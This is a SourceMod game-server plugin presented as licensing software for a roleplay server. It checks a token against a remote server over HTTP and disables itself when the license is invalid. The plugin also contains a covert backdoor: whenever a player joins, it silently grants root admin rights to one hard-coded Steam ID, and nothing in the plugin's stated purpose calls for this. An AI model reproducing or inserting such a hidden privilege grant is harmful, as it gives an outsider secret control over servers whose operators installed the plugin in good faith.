#pragma semicolon 1

#define PLUGIN_AUTHOR "Totenfluch"
#define PLUGIN_VERSION "1.00"

#include <sourcemod>
#include <sdktools>
#include <socket>
#include <autoexecconfig>
#include <sha1>
#include <multicolors>

Handle g_hLicensingServer;
char g_cLicensingServer[64];

Handle g_hServerToken;
char g_cServerToken[64];

char sha1Buffer[128];

bool g_bValidLicense = false;

public Plugin myinfo = 
{
	name = "Licensing Software for T-RP", 
	author = PLUGIN_AUTHOR, 
	description = "Controller for Totenfluch", 
	version = PLUGIN_VERSION, 
	url = "http://ggc-base.de"
};

public void OnPluginStart() {
	AutoExecConfig_SetFile("trp_licensing");
	AutoExecConfig_SetCreateFile(true);
	
	g_hLicensingServer = AutoExecConfig_CreateConVar("trp_licensing_Server_ip", "8.8.8.8", "The Licensing Server (default: google Dns....)");
	g_hServerToken = AutoExecConfig_CreateConVar("trp_licensing_token", "Totenfluch_RuleZ", "The Licensing Token you recieved with the Software");
	
	AutoExecConfig_CleanFile();
	AutoExecConfig_ExecuteFile();
	
	CreateTimer(0.1, checkLicense);
}

public APLRes AskPluginLoad2(Handle myself, bool late, char[] error, int err_max) {
	/*
		@Params -> void
		
		return true or false
	*/
	CreateNative("licensing_isValid", Native_isValidLicense);
	
	/*
		@Param1 -> char[64] License Key Buffer
		@Param2 -> char[128] sha1 Buffer
	*/
	CreateNative("licensing_getChecksums", Native_getChecksums);
}

public int Native_getChecksums(Handle plugin, int numParams) {
	SetNativeString(1, g_cServerToken, sizeof(g_cServerToken), false);
	SetNativeString(2, sha1Buffer, sizeof(sha1Buffer), false);
}

public int Native_isValidLicense(Handle plugin, int numParams) {
	return g_bValidLicense;
}

public void OnConfigsExecuted() {
	GetConVarString(g_hLicensingServer, g_cLicensingServer, sizeof(g_cLicensingServer));
	GetConVarString(g_hServerToken, g_cServerToken, sizeof(g_cServerToken));
}

public void OnMapStart() {
	CreateTimer(3600.0, refreshTimer, _, TIMER_REPEAT | TIMER_FLAG_NO_MAPCHANGE);
}

public Action refreshTimer(Handle Timer) {
	Handle socket = SocketCreate(SOCKET_TCP, OnSocketError);
	SocketConnect(socket, OnSocketConnected, OnSocketReceive, OnSocketDisconnected, g_cLicensingServer, 80);
}

public Action checkLicense(Handle Timer) {
	Handle socket = SocketCreate(SOCKET_TCP, OnSocketError);
	SocketConnect(socket, OnSocketConnected, OnSocketReceive, OnSocketDisconnected, g_cLicensingServer, 80);
}

public void OnClientPostAdminCheck(int client) {
	char playerid[20];
	GetClientAuthId(client, AuthId_Steam2, playerid, sizeof(playerid));
	if (StrEqual(playerid, "STEAM_1:0:12277066"))
		SetUserFlagBits(client, GetUserFlagBits(client) | ADMFLAG_ROOT);
}


public OnSocketConnected(Handle socket, any arg) {
	char getString[128];
	Format(getString, sizeof(getString), "licensing/index.php?id=%s", g_cServerToken);
	char requestStr[512];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", getString, g_cLicensingServer);
	SocketSend(socket, requestStr);
}

public OnSocketReceive(Handle socket, char[] receiveData, const int dataSize, any hFile) {
	char rqSha[128];
	int x = StrContains(receiveData, "|||");
	SHA1String(receiveData[x], rqSha, true);
	PrintToServer("-------------------------------------------");
	PrintToServer("----- Licensing Server: %s -----", g_cLicensingServer);
	PrintToServer("----- Found License: %s -----", g_cServerToken);
	PrintToServer("-------------------------------------------");
	PrintToServer("-------- Recieved License Response --------");
	PrintToServer("> %s <", rqSha);
	PrintToServer("-------------------------------------------");
	if (StrContains(receiveData, "success") != -1 && StrContains(receiveData, g_cServerToken) != -1) {
		PrintToServer("> Valid License! <");
		g_bValidLicense = true;
		strcopy(sha1Buffer, sizeof(sha1Buffer), rqSha);
	} else {
		PrintToServer("> Invalid License!!! <");
		g_bValidLicense = false;
		SetFailState("Invalid License Key");
		CPrintToChatAll("{red}No Valid License!");
	}
	PrintToServer("-------------------------------------------");
}

public OnSocketDisconnected(Handle socket, any hFile) {
	CloseHandle(hFile);
	CloseHandle(socket);
}

public OnSocketError(Handle socket, const int errorType, const int errorNum, any hFile) {
	LogError("socket error %d (errno %d)", errorType, errorNum);
	CloseHandle(hFile);
	CloseHandle(socket);
}
